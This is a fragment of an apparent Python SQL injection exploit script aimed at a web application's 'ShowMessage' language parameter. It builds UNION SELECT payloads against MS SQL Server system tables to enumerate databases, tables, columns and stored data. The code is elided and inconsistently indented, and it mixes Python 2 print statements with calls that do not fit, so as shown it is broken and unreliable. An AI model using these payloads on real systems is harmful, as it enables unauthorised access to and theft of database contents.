    ...
    def sql():
        def sqlblind():
			...
			print "[+] Error: Error requesting URL (%s)" % msg
			    ...
			    print current
            def dbenum():
	        retrievedata(url + "?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYS.SYSDATABASES where name> '")
            def tableenum(database=''):
	        if database=='':
		    retrievedata(url + "?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYSOBJECTS where xtype=char(85) and name> '")
	        else:
		    retrievedata(url + "?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM " + database + "..SYSOBJECTS where xtype=char(85) and name> '")
            def colenum(table, database=''):
	        if table=='':
		    usage()
	        if database=='':
		    retrievedata(url + "?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYSCOLUMNS where name > '", "' AND id = (SELECT id from SYSOBJECTS WHERE name= '" + table + "') ORDER BY 1;-- &DisableAutoLogin=1")
	        else:
		    retrievedata(url + "?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM " + database + "..SYSCOLUMNS where name > '","' AND id = (SELECT id from " + database + "..SYSOBJECTS WHERE name= '" + table + "') ORDER BY 1;-- &DisableAutoLogin=1")
            def dataenum(column, table, database=''):
	        if column=='' or table=='':
		    usage()
	        if database=='':
		    retrievedata(url + "?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT MIN(" + column + ") FROM " + table + " WHERE " + column + "> '")
	        else:
		    retrievedata(url + "?Action=ShowMessage&LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT MIN(" + column + ") FROM " + database + ".." + table + " WHERE " + column + "> '")
            banner()
            pdbenum = 0
            ptableenum = 0
            pcolenum = 0
            ...
            column = ''
            try:
	        opts, args = getopt.getopt(input(), "d:t:c:h:", ["help", "dbenum", "tableenum", "colenum", "dataenum"])
